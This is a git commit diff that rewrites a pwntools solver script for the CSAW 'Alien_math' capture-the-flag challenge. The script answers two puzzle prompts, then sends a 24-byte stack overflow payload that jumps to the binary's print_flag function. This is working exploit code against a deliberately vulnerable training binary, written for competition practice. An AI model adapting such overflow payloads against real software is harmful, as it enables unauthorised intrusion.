56b44b3a59bc2f908ee70e19ba95648d3d63125b
M-Pepper <46696465+M-Pepper@users.noreply.github.com>
2021-09-12 09:22:47 -0400

    Update solver.py

--- pwn/Alien_math/solver.py
+++ pwn/Alien_math/solver.py
@@ -11,35 +11,33 @@ printFlag = p64(math_elf.symbols.print_flag)
 OFFSET = 24
 junk = b"A" * OFFSET
 
-while True:
-    if LOCAL == True:
-        p = remote('pwn.chal.csaw.io', 5004, ssl=False)
-    else:
-        p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')
-    guess1 = b"1804289383"
-    p.sendlineafter("What is the square root of zopnol?", guess1)
-    leak = p.recvuntil("!\n")
-    log.info(f"{leak = }")
-    if b"Correct!\n" in leak:
-        False
-        guess2 = b"7856445899213065428791" #------> What we want to make: 7759406485255323229225
-        p.sendlineafter("How many tewgrunbs are in a qorbnorbf?", guess2)
-        #leak = p.recvuntil("You get a C. No flag this time.\n") ------> Debugging purposes
-        leak = p.recvuntil("Genius! One question left...\n")
-        log.info(f"{leak = }")
-        if b"\nGenius!" in leak:
-            False
-            
-            payload = [
-                junk,
-                printFlag,
-            ]
+if LOCAL == False:
+    p = remote('pwn.chal.csaw.io', 5004, ssl=False)
+else:
+    p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')
 
-            payload = b''.join(payload)
-            #payload = b''.join([p64(r) for r in payload])
-            p.sendline(payload)
-            p.interactive()
-        else:
-            p.kill()
+guess1 = b"1804289383"
+p.sendlineafter("What is the square root of zopnol?", guess1)
+leak = p.recvuntil("!\n")
+log.info(f"{leak = }")
+
+if b"Correct!\n" in leak:
+    guess2 = b"7856445899213065428791" #------> What we want to make: 7759406485255323229225
+    p.sendlineafter("How many tewgrunbs are in a qorbnorbf?", guess2)
+    #leak = p.recvuntil("You get a C. No flag this time.\n") ------> Debugging purposes
+    leak = p.recvuntil("Genius! One question left...\n")
+    log.info(f"{leak = }")
+
+    if b"\nGenius!" in leak:
+        payload = [
+            junk,
+            printFlag,
+        ]
+        payload = b''.join(payload)
+        #payload = b''.join([p64(r) for r in payload])
+        p.sendline(payload)
+        p.interactive()
     else:
         p.kill()
+else:
+    p.kill()
